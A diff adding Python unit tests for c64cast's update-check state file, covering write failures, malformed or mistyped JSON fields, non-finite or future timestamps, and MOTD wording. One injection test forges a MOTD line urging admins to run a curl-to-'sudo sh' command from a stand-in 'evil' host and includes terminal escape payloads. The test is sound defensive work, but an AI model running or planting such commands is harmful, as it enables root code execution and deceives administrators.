@@ -10,7 +10,9 @@ import unittest
 from collections.abc import Generator
 from dataclasses import replace
 from pathlib import Path
+from unittest import mock
 
+from c64cast.app import update_state
 from c64cast.app.update_state import (
     SECONDS_PER_DAY,
     STALE_AFTER_DAYS,
@@ -77,6 +79,40 @@ class RoundTripTest(unittest.TestCase):
                 path=nested,
             )
             self.assertTrue(nested.is_file())
+
+
+class WriteFailureTest(unittest.TestCase):
+    """`cli_commands.run_check_for_updates` records before it prints the
+    answer it already holds, so a write that cannot succeed must not take
+    the answer — or the systemd unit's exit status — down with it."""
+
+    attempt = UpdateCheck(
+        checked_at=1.0, running_version="0.5.0", latest_version="0.6.0", newer=True
+    )
+
+    def test_an_unwritable_data_root_warns_instead_of_raising(self):
+        # A $C64CAST_DATA_DIR pointed into a squashfs, or a tmpfs that filled.
+        with _tmp_json_path() as path:
+            with (
+                mock.patch.object(
+                    update_state, "atomic_write_text", side_effect=OSError("read-only")
+                ),
+                self.assertLogs("c64cast.app.update_state", level="WARNING") as logs,
+            ):
+                record_check(self.attempt, path=path)
+        self.assertIn("could not record the update check", logs.output[0])
+
+    def test_a_directory_planted_at_the_slot_warns_instead_of_raising(self):
+        # One mkdir by whatever account owns the data root used to make every
+        # subsequent `--check-for-updates --write-state` traceback: os.replace
+        # cannot rename a file onto a directory, and record_check did not
+        # catch it, so the slot could never be repaired.
+        with _tmp_dir() as d:
+            planted = Path(d) / "update_check.json"
+            planted.mkdir()
+            with self.assertLogs("c64cast.app.update_state", level="WARNING"):
+                record_check(self.attempt, path=planted)
+            self.assertIsNone(read_update_state(path=planted))
 
 
 class RecordCheckTest(unittest.TestCase):
@@ -224,6 +260,92 @@ class ReadToleranceTest(unittest.TestCase):
             with self.assertLogs("c64cast.app.update_state", level="DEBUG"):
                 self.assertIsNone(read_update_state(path=path))
 
+    def test_invalid_utf8_bytes_read_as_none(self):
+        # read_text signals bad bytes with UnicodeDecodeError, a ValueError,
+        # and the read was guarded by `except OSError` alone — so one bad byte
+        # raised out of a "never raises" function into GET /api/update and
+        # into the login MOTD script, and record_check (which reads before it
+        # writes) could never repair the slot.
+        with _tmp_json_path() as path:
+            path.write_bytes(b'{"checked_at": 1.0, "running_ver\xff\xfe')
+            with self.assertLogs("c64cast.app.update_state", level="DEBUG"):
+                self.assertIsNone(read_update_state(path=path))
+
+    def test_a_stringly_typed_newer_is_rejected_not_coerced(self):
+        # bool("false") is True, so this used to read back as a pending
+        # upgrade to the release the box already runs — and `rechecked`
+        # cannot correct it, since a matching running_version is returned
+        # untouched.
+        with self.assertLogs("c64cast.app.update_state", level="DEBUG"):
+            self.assertIsNone(self._slot_from({"newer": "false"}))
+
+    def test_a_non_string_version_field_is_rejected_not_repr_ed(self):
+        for field in ("running_version", "latest_version"):
+            for value in (5, ["0.6.0"], {"v": "0.6.0"}, True):
+                with self.subTest(field=field, value=value):
+                    with self.assertLogs("c64cast.app.update_state", level="DEBUG"):
+                        self.assertIsNone(self._slot_from({field: value}))
+
+    def test_a_version_carrying_a_newline_or_escape_is_rejected(self):
+        # The file is written by the unprivileged account
+        # packaging/systemd/c64cast-update-check.service runs as; the line
+        # motd_line builds from it is printed by /etc/update-motd.d/, which
+        # pam_motd runs as root. A newline forges an extra MOTD line, and an
+        # ESC byte rewrites the banner around it.
+        forged = "0.6.0\n\nSECURITY: apply the hotfix now: curl -s http://evil/p.sh | sudo sh\n"
+        for value in (forged, "0.6.0\x1b[2J", "0.6.0\x1b]52;c;cGF5bG9hZA==\x07"):
+            with self.subTest(value=value):
+                with self.assertLogs("c64cast.app.update_state", level="DEBUG"):
+                    self.assertIsNone(self._slot_from({"latest_version": value}))
+
+    def test_a_non_finite_timestamp_is_rejected(self):
+        # json.loads accepts the bare NaN/Infinity literals, and every
+        # comparison in is_stale reads as "not stale" for either — one write
+        # disabled the module's only safeguard against quoting a dead answer.
+        for field in ("checked_at", "unanswered_since"):
+            for literal in ("NaN", "Infinity", "-Infinity"):
+                with self.subTest(field=field, literal=literal):
+                    with self.assertLogs("c64cast.app.update_state", level="DEBUG"):
+                        self.assertIsNone(self._slot_from_json(f'"{field}": {literal}'))
+
+    def test_a_non_positive_timestamp_is_rejected(self):
+        with self.assertLogs("c64cast.app.update_state", level="DEBUG"):
+            self.assertIsNone(self._slot_from({"checked_at": 0}))
+
+    def test_a_boolean_timestamp_is_rejected(self):
+        # bool is a subclass of int, so `true` would otherwise read as the
+        # epoch's first second.
+        with self.assertLogs("c64cast.app.update_state", level="DEBUG"):
+            self.assertIsNone(self._slot_from({"checked_at": True}))
+
+    _GOOD = {
+        "checked_at": 1.0,
+        "running_version": "0.5.0",
+        "latest_version": "0.6.0",
+        "newer": True,
+        "unanswered_since": None,
+    }
+
+    def _slot_from(self, overrides: dict[str, object]) -> UpdateCheck | None:
+        """Read a well-formed record with `overrides` applied, so each test
+        names only the one field it is poisoning."""
+        with _tmp_json_path() as path:
+            path.write_text(json.dumps({**self._GOOD, **overrides}), encoding="utf-8")
+            return read_update_state(path=path)
+
+    def _slot_from_json(self, member: str) -> UpdateCheck | None:
+        """Same, for a value `json.dumps` cannot write — the bare `NaN` and
+        `Infinity` literals `json.loads` nonetheless accepts."""
+        with _tmp_json_path() as path:
+            body = json.dumps(self._GOOD)[:-1] + f", {member}}}"
+            path.write_text(body, encoding="utf-8")
+            return read_update_state(path=path)
+
+    def test_the_fixture_the_poisoning_tests_start_from_reads_cleanly(self):
+        slot = self._slot_from({})
+        assert slot is not None
+        self.assertEqual(slot.latest_version, "0.6.0")
+
 
 class RecheckedTest(unittest.TestCase):
     """A recorded check names the version that was running when it ran; the
@@ -313,6 +435,37 @@ class IsStaleTest(unittest.TestCase):
         )
         self.assertFalse(is_stale(blipped, NOW))
 
+    def test_a_date_in_the_future_is_stale_rather_than_fresh(self):
+        # "Can't tell how old this is" is not "recent" — the same asymmetry
+        # _checkout_is_dirty's None gets. A far-future date otherwise made
+        # every comparison here read as fresh, forever.
+        dated_ahead = UpdateCheck(
+            checked_at=_days_ago(-3650),
+            running_version="0.5.0",
+            latest_version="0.5.0",
+            newer=False,
+        )
+        self.assertTrue(is_stale(dated_ahead, NOW))
+
+    def test_a_clock_skewed_by_an_hour_is_not_called_stale(self):
+        skewed = UpdateCheck(
+            checked_at=NOW + 3600.0, running_version="0.5.0", latest_version="0.5.0", newer=False
+        )
+        self.assertFalse(is_stale(skewed, NOW))
+
+    def test_a_non_finite_date_is_stale(self):
+        # read_update_state rejects such a record outright; this guards a
+        # check built in process.
+        for stamp in (float("nan"), float("inf"), float("-inf")):
+            with self.subTest(stamp=stamp):
+                broken = UpdateCheck(
+                    checked_at=stamp,
+                    running_version="0.5.0",
+                    latest_version="0.5.0",
+                    newer=False,
+                )
+                self.assertTrue(is_stale(broken, NOW))
+
 
 class MotdLineTest(unittest.TestCase):
     def test_no_check_is_silent(self):
@@ -351,6 +504,18 @@ class MotdLineTest(unittest.TestCase):
         self.assertIn(str(STALE_AFTER_DAYS), line)
         self.assertIn("0.5.0", line)
         self.assertIn("c64cast --check-for-updates", line)
+
+    def test_the_stale_line_blames_the_check_rather_than_pypi(self):
+        # is_stale falls back to checked_at when unanswered_since is None, and
+        # in that branch the last attempt *did* answer — the no-timer laptop
+        # nobody has asked in a while. "No answer from PyPI" sent an admin
+        # hunting a network fault that does not exist.
+        forgotten = UpdateCheck(
+            checked_at=_days_ago(365), running_version="0.5.0", latest_version="0.5.0", newer=False
+        )
+        line = motd_line(forgotten, NOW)
+        self.assertIn("No update check has succeeded", line)
+        self.assertNotIn("PyPI", line)
 
     def test_a_pending_upgrade_outranks_a_stale_check(self):
         # Both true at once: the release named is the more useful thing to
